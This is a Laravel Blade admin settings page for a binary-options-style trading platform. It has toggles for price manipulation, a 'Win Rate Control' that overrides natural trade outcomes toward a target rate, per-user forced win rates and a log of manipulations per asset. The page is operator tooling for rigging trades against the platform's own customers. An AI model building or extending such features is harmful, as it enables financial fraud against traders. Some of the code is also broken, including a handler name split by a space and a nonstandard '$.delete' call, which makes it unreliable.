@extends('layouts.app')

@section('styles')
<style>
    .settings-card {
        background: white;
        border-radius: 15px;
        padding: 25px;
        margin-bottom: 20px;
        box-shadow: 0 8px 25px rgba(0,0,0,0.1);
    }
    
    .settings-header {
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        border-radius: 12px;
        color: white;
        padding: 20px;
        margin-bottom: 25px;
    }
    
    .setting-group {
        background: #f8f9fa;
        border-radius: 10px;
        padding: 20px;
        margin-bottom: 20px;
        border-left: 4px solid #007bff;
    }
    
    .setting-group.danger {
        border-left-color: #dc3545;
        background: #fff5f5;
    }
    
    .setting-group.warning {
        border-left-color: #ffc107;
        background: #fffbf0;
    }
    
    .setting-group.success {
        border-left-color: #28a745;
        background: #f0fff4;
    }
    
    .toggle-switch {
        position: relative;
        display: inline-block;
        width: 60px;
        height: 34px;
    }
    
    .toggle-switch input {
        opacity: 0;
        width: 0;
        height: 0;
    }
    
    .slider {
        position: absolute;
        cursor: pointer;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background-color: #ccc;
        transition: .4s;
        border-radius: 34px;
    }
    
    .slider:before {
        position: absolute;
        content: "";
        height: 26px;
        width: 26px;
        left: 4px;
        bottom: 4px;
        background-color: white;
        transition: .4s;
        border-radius: 50%;
    }
    
    input:checked + .slider {
        background-color: #28a745;
    }
    
    input:checked + .slider:before {
        transform: translateX(26px);
    }
    
    .assets-table {
        background: white;
        border-radius: 12px;
        overflow: hidden;
        box-shadow: 0 4px 15px rgba(0,0,0,0.1);
    }
    
    .manipulation-log {
        background: #f8f9fa;
        border-radius: 8px;
        padding: 15px;
        margin-bottom: 15px;
        border-left: 4px solid #dc3545;
    }
    
    .user-control-item {
        background: white;
        border-radius: 10px;
        padding: 15px;
        margin-bottom: 15px;
        box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        border-left: 4px solid #007bff;
    }
    
    .stats-mini {
        background: linear-gradient(135deg, #17a2b8, #138496);
        color: white;
        border-radius: 10px;
        padding: 15px;
        text-align: center;
        margin-bottom: 15px;
    }
</style>
@endsection

@section('content')
<div class="settings-header">
    <div class="row align-items-center">
        <div class="col-md-8">
            <h3><i class="fa fa-cogs"></i> Trading System Settings</h3>
            <p class="mb-0">Configure trading parameters, manipulation controls, and user restrictions</p>
        </div>
        <div class="col-md-4 text-right">
            <button class="btn btn-light" onclick="resetAllSettings()">
                <i class="fa fa-refresh"></i> Reset to Defaults
            </button>
        </div>
    </div>
</div>

<div class="row">
    <!-- General Settings -->
    <div class="col-lg-6 col-md-12">
        <div class="settings-card">
            <h5><i class="fa fa-sliders-h"></i> General Settings</h5>
            
            <div class="setting-group">
                <h6>Trading Status</h6>
                <div class="row align-items-center">
                    <div class="col-md-8">
                        <p class="mb-0">Enable/disable trading system globally</p>
                    </div>
                    <div class="col-md-4 text-right">
                        <label class="toggle-switch">
                            <input type="checkbox" id="tradingEnabled" 
                                   {{ $settings['trading_enabled'] ?? true ? 'checked' : '' }}>
                            <span class="slider"></span>
                        </label>
                    </div>
                </div>
            </div>
            
            <div class="setting-group">
                <h6>Default Trade Duration</h6>
                <div class="row">
                    <div class="col-md-6">
                        <label>Fixed Time (seconds)</label>
                        <input type="number" class="form-control" id="defaultDuration" 
                               value="{{ $settings['default_trade_duration'] ?? 90 }}" min="30" max="300">
                    </div>
                    <div class="col-md-6">
                        <label>Payout Rate (%)</label>
                        <input type="number" class="form-control" id="payoutRate" 
                               value="{{ $settings['payout_rate'] ?? 85 }}" min="50" max="95" step="0.1">
                    </div>
                </div>
            </div>
            
            <div class="setting-group">
                <h6>Trade Limits</h6>
                <div class="row">
                    <div class="col-md-6">
                        <label>Minimum Trade ($)</label>
                        <input type="number" class="form-control" id="minTrade" 
                               value="{{ $settings['min_trade_amount'] ?? 1 }}" min="1" step="0.01">
                    </div>
                    <div class="col-md-6">
                        <label>Maximum Trade ($)</label>
                        <input type="number" class="form-control" id="maxTrade" 
                               value="{{ $settings['max_trade_amount'] ?? 1000 }}" min="1">
                    </div>
                </div>
            </div>
            
            <div class="setting-group warning">
                <h6>Manipulation Controls</h6>
                <div class="row align-items-center mb-3">
                    <div class="col-md-8">
                        <p class="mb-0">Enable price manipulation features</p>
                    </div>
                    <div class="col-md-4 text-right">
                        <label class="toggle-switch">
                            <input type="checkbox" id="manipulationEnabled" 
                                   {{ $settings['manipulation_enabled'] ?? true ? 'checked' : '' }}>
                            <span class="slider"></span>
                        </label>
                    </div>
                </div>
                
                <div class="row">
                    <div class="col-md-6">
                        <label>Max Price Change (%)</label>
                        <input type="number" class="form-control" id="maxPriceChange" 
                               value="{{ $settings['max_price_change'] ?? 5 }}" min="0.1" max="20" step="0.1">
                    </div>
                    <div class="col-md-6">
                        <label>Manipulation Duration (min)</label>
                        <input type="number" class="form-control" id="manipulationDuration" 
                               value="{{ $settings['manipulation_duration'] ?? 30 }}" min="1" max="120">
                    </div>
                </div>
            </div>
            
            <div class="setting-group danger">
                <h6>Win Rate Control</h6>
                <div class="row align-items-center mb-3">
                    <div class="col-md-8">
                        <p class="mb-0">Override natural trading outcomes</p>
                    </div>
                    <div class="col-md-4 text-right">
                        <label class="toggle-switch">
                            <input type="checkbox" id="winRateControlEnabled" 
                                   {{ $settings['win_rate_control_enabled'] ?? false ? 'checked' : '' }}>
                            <span class="slider"></span>
                        </label>
                    </div>
                </div>
                
                <div class="row">
                    <div class="col-md-6">
                        <label>Target Win Rate (%)</label>
                        <input type="number" class="form-control" id="targetWinRate" 
                               value="{{ $settings['target_win_rate'] ?? 45 }}" min="10" max="90">
                    </div>
                    <div class="col-md-6">
                        <label>Control Aggressiveness</label>
                        <select class="form-control" id="controlAggressiveness">
                            <option value="low" {{ ($settings['control_aggressiveness'] ?? 'medium') == 'low' ? 'selected' : '' }}>Low</option>
                            <option value="medium" {{ ($settings['control_aggressiveness'] ?? 'medium') == 'medium' ? 'selected' : '' }}>Medium</option>
                            <option value="high" {{ ($settings['control_aggressiveness'] ?? 'medium') == 'high' ? 'selected' : '' }}>High</option>
                        </select>
                    </div>
                </div>
            </div>
            
            <button class="btn btn-primary btn-block" onclick="saveGeneralSettings()">
                <i class="fa fa-save"></i> Save General Settings
            </button>
        </div>
    </div>
    
    <!-- Assets Management -->
    <div class="col-lg-6 col-md-12">
        <div class="settings-card">
            <div class="d-flex justify-content-between align-items-center mb-4">
                <h5><i class="fa fa-coins"></i> Trading Assets</h5>
                <button class="btn btn-sm btn-primary" onclick="addNewAsset()">
                    <i class="fa fa-plus"></i> Add Asset
                </button>
            </div>
            
            <div class="table-responsive assets-table">
                <table class="table table-striped mb-0">
                    <thead class="bg-light">
                        <tr>
                            <th>Asset</th>
                            <th>Status</th>
                            <th>Manipulation</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody id="assetsTableBody">
                        @foreach($assets as $asset)
                        <tr id="asset-{{ $asset->id }}">
                            <td>
                                <strong>{{ $asset->name }}</strong><br>
                                <small class="text-muted">{{ $asset->symbol }}</small>
                            </td>
                            <td>
                                <label class="toggle-switch">
                                    <input type="checkbox" onchange="toggleAssetStatus({{ $asset->id }})" 
                                           {{ $asset->is_active ? 'checked' : '' }}>
                                    <span class="slider"></span>
                                </label>
                            </td>
                            <td>
                                <span class="badge badge-{{ $asset->manipulation_active ? 'warning' : 'secondary' }}">
                                    {{ $asset->manipulation_active ? 'Active' : 'None' }}
                                </span>
                            </td>
                            <td>
                                <button class="btn btn-sm btn-info" onclick="configureAsset({{ $asset->id }})">
                                    <i class="fa fa-cog"></i>
                                </button>
                                <button class="btn btn-sm btn-danger" onclick="removeAsset({{ $asset->id }})">
                                    <i class="fa fa-trash"></i>
                                </button>
                            </td>
                        </tr>
                        @endforeach
                    </tbody>
                </table>
            </div>
        </div>
        
        <!-- Quick Stats -->
        <div class="row">
            <div class="col-md-4">
                <div class="stats-mini">
                    <div class="h4" id="totalAssets">{{ count($assets) }}</div>
                    <small>Total Assets</small>
                </div>
            </div>
            <div class="col-md-4">
                <div class="stats-mini">
                    <div class="h4" id="activeAssets">{{ $assets->where('is_active', true)->count() }}</div>
                    <small>Active Assets</small>
                </div>
            </div>
            <div class="col-md-4">
                <div class="stats-mini">
                    <div class="h4" id="manipulatedAssets">{{ $assets->where('manipulation_active', true)->count() }}</div>
                    <small>Manipulated</small>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- User Controls -->
<div class="row mt-4">
    <div class="col-12">
        <div class="settings-card">
            <h5><i class="fa fa-users"></i> User Trading Controls</h5>
            
            <div class="row">
                <div class="col-lg-8 col-md-12">
                    <div class="table-responsive">
                        <table class="table">
                            <thead>
                                <tr>
                                    <th>User</th>
                                    <th>Status</th>
                                    <th>Daily Limit</th>
                                    <th>Win Rate</th>
                                    <th>Actions</th>
                                </tr>
                            </thead>
                            <tbody id="userControlsTable">
                                @foreach($userControls as $control)
                                <tr>
                                    <td>
                                        <strong>{{ $control->user->name }}</strong><br>
                                        <small class="text-muted">{{ $control->user->email }}</small>
                                    </td>
                                    <td>
                                        <span class="badge badge-{{ $control->is_restricted ? 'danger' : 'success' }}">
                                            {{ $control->is_restricted ? 'Restricted' : 'Active' }}
                                        </span>
                                    </td>
                                    <td>${{ number_format($control->daily_trade_limit ?? 1000, 2) }}</td>
                                    <td>{{ number_format($control->forced_win_rate ?? 0, 1) }}%</td>
                                    <td>
                                        <button class="btn btn-sm btn-warning" onclick="editUserControl({{ $control->user->id }})">
                                            <i class="fa fa-edit"></i>
                                        </button>
                                        <button class="btn btn-sm btn-{{ $control->is_restricted ? 'success' : 'danger' }}" 
                                                onclick="toggleUserRestriction({{ $control->user->id }})">
                                            <i class="fa fa-{{ $control->is_restricted ? 'unlock' : 'lock' }}"></i>
                                        </button>
                                    </td>
                                </tr>
                                @endforeach
                            </tbody>
                        </table>
                    </div>
                </div>
                
                <div class="col-lg-4 col-md-12">
                    <div class="setting-group">
                        <h6>Bulk User Actions</h6>
                        <button class="btn btn-warning btn-block mb-2" onclick="restrictAllUsers()">
                            <i class="fa fa-lock"></i> Restrict All Users
                        </button>
                        <button class="btn btn-success btn-block mb-2" onclick="unrestrict AllUsers()">
                            <i class="fa fa-unlock"></i> Unrestrict All Users
                        </button>
                        <button class="btn btn-info btn-block" onclick="exportUserControls()">
                            <i class="fa fa-download"></i> Export Controls
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Recent Manipulation Log -->
<div class="row mt-4">
    <div class="col-12">
        <div class="settings-card">
            <h5><i class="fa fa-history"></i> Recent Manipulation Log</h5>
            
            <div id="manipulationLog">
                @forelse($recentManipulations as $log)
                <div class="manipulation-log">
                    <div class="row align-items-center">
                        <div class="col-md-3">
                            <strong>{{ $log->asset->name ?? 'Unknown' }}</strong>
                        </div>
                        <div class="col-md-3">
                            <span class="badge badge-info">{{ ucfirst($log->manipulation_type) }}</span>
                        </div>
                        <div class="col-md-3">
                            <small class="text-muted">{{ $log->created_at->diffForHumans() }}</small>
                        </div>
                        <div class="col-md-3 text-right">
                            <button class="btn btn-sm btn-outline-danger" onclick="revertManipulation({{ $log->id }})">
                                <i class="fa fa-undo"></i> Revert
                            </button>
                        </div>
                    </div>
                </div>
                @empty
                <div class="text-center text-muted py-4">
                    <i class="fa fa-info-circle fa-2x mb-2"></i>
                    <p>No recent manipulations</p>
                </div>
                @endforelse
            </div>
        </div>
    </div>
</div>

<!-- Asset Configuration Modal -->
<div class="modal fade" id="assetConfigModal" tabindex="-1" role="dialog">
    <div class="modal-dialog" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Asset Configuration</h5>
                <button type="button" class="close" data-dismiss="modal">
                    <span>&times;</span>
                </button>
            </div>
            <div class="modal-body" id="assetConfigContent">
                <!-- Content loaded dynamically -->
            </div>
        </div>
    </div>
</div>

<!-- User Control Edit Modal -->
<div class="modal fade" id="userControlModal" tabindex="-1" role="dialog">
    <div class="modal-dialog" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Edit User Trading Controls</h5>
                <button type="button" class="close" data-dismiss="modal">
                    <span>&times;</span>
                </button>
            </div>
            <div class="modal-body" id="userControlContent">
                <!-- Content loaded dynamically -->
            </div>
        </div>
    </div>
</div>
@endsection

@section('scripts')
<script>
$(document).ready(function() {
    // Initialize tooltips
    $('[data-toggle="tooltip"]').tooltip();
});

function saveGeneralSettings() {
    const settings = {
        trading_enabled: $('#tradingEnabled').prop('checked'),
        default_trade_duration: $('#defaultDuration').val(),
        payout_rate: $('#payoutRate').val(),
        min_trade_amount: $('#minTrade').val(),
        max_trade_amount: $('#maxTrade').val(),
        manipulation_enabled: $('#manipulationEnabled').prop('checked'),
        max_price_change: $('#maxPriceChange').val(),
        manipulation_duration: $('#manipulationDuration').val(),
        win_rate_control_enabled: $('#winRateControlEnabled').prop('checked'),
        target_win_rate: $('#targetWinRate').val(),
        control_aggressiveness: $('#controlAggressiveness').val(),
        _token: $('meta[name="csrf-token"]').attr('content')
    };
    
    $.post('/api/admin/trading/settings/update', settings).done(function(response) {
        toastr.success('Settings saved successfully');
    }).fail(function() {
        toastr.error('Failed to save settings');
    });
}

function toggleAssetStatus(assetId) {
    $.post(`/api/admin/trading/assets/${assetId}/toggle`, {
        _token: $('meta[name="csrf-token"]').attr('content')
    }).done(function(response) {
        toastr.success('Asset status updated');
        updateAssetStats();
    }).fail(function() {
        toastr.error('Failed to update asset status');
    });
}

function configureAsset(assetId) {
    $.get(`/api/admin/trading/assets/${assetId}/config`, function(data) {
        $('#assetConfigContent').html(data.html);
        $('#assetConfigModal').modal('show');
    });
}

function removeAsset(assetId) {
    if (confirm('Are you sure you want to remove this asset?')) {
        $.delete(`/api/admin/trading/assets/${assetId}`, {
            _token: $('meta[name="csrf-token"]').attr('content')
        }).done(function(response) {
            $(`#asset-${assetId}`).remove();
            toastr.success('Asset removed successfully');
            updateAssetStats();
        }).fail(function() {
            toastr.error('Failed to remove asset');
        });
    }
}

function addNewAsset() {
    const assetData = {
        name: prompt('Asset Name:'),
        symbol: prompt('Asset Symbol:'),
        _token: $('meta[name="csrf-token"]').attr('content')
    };
    
    if (assetData.name && assetData.symbol) {
        $.post('/api/admin/trading/assets/create', assetData).done(function(response) {
            toastr.success('Asset added successfully');
            location.reload();
        }).fail(function() {
            toastr.error('Failed to add asset');
        });
    }
}

function editUserControl(userId) {
    $.get(`/api/admin/trading/user-controls/${userId}`, function(data) {
        $('#userControlContent').html(data.html);
        $('#userControlModal').modal('show');
    });
}

function toggleUserRestriction(userId) {
    $.post(`/api/admin/trading/user-controls/${userId}/toggle-restriction`, {
        _token: $('meta[name="csrf-token"]').attr('content')
    }).done(function(response) {
        toastr.success('User restriction toggled');
        location.reload();
    }).fail(function() {
        toastr.error('Failed to toggle user restriction');
    });
}

function restrictAllUsers() {
    if (confirm('Restrict trading for all users?')) {
        $.post('/api/admin/trading/user-controls/restrict-all', {
            _token: $('meta[name="csrf-token"]').attr('content')
        }).done(function(response) {
            toastr.success('All users restricted');
            location.reload();
        }).fail(function() {
            toastr.error('Failed to restrict all users');
        });
    }
}

function unrestrictAllUsers() {
    if (confirm('Remove restrictions for all users?')) {
        $.post('/api/admin/trading/user-controls/unrestrict-all', {
            _token: $('meta[name="csrf-token"]').attr('content')
        }).done(function(response) {
            toastr.success('All restrictions removed');
            location.reload();
        }).fail(function() {
            toastr.error('Failed to remove restrictions');
        });
    }
}

function revertManipulation(logId) {
    if (confirm('Revert this manipulation?')) {
        $.post(`/api/admin/trading/manipulations/${logId}/revert`, {
            _token: $('meta[name="csrf-token"]').attr('content')
        }).done(function(response) {
            toastr.success('Manipulation reverted');
            location.reload();
        }).fail(function() {
            toastr.error('Failed to revert manipulation');
        });
    }
}

function resetAllSettings() {
    if (confirm('Reset all settings to default values?')) {
        $.post('/api/admin/trading/settings/reset', {
            _token: $('meta[name="csrf-token"]').attr('content')
        }).done(function(response) {
            toastr.success('Settings reset to defaults');
            location.reload();
        }).fail(function() {
            toastr.error('Failed to reset settings');
        });
    }
}

function updateAssetStats() {
    $.get('/api/admin/trading/assets/stats', function(stats) {
        $('#totalAssets').text(stats.total);
        $('#activeAssets').text(stats.active);
        $('#manipulatedAssets').text(stats.manipulated);
    });
}

function exportUserControls() {
    window.open('/api/admin/trading/user-controls/export', '_blank');
    toastr.success('Export started');
}
</script>
@endsection
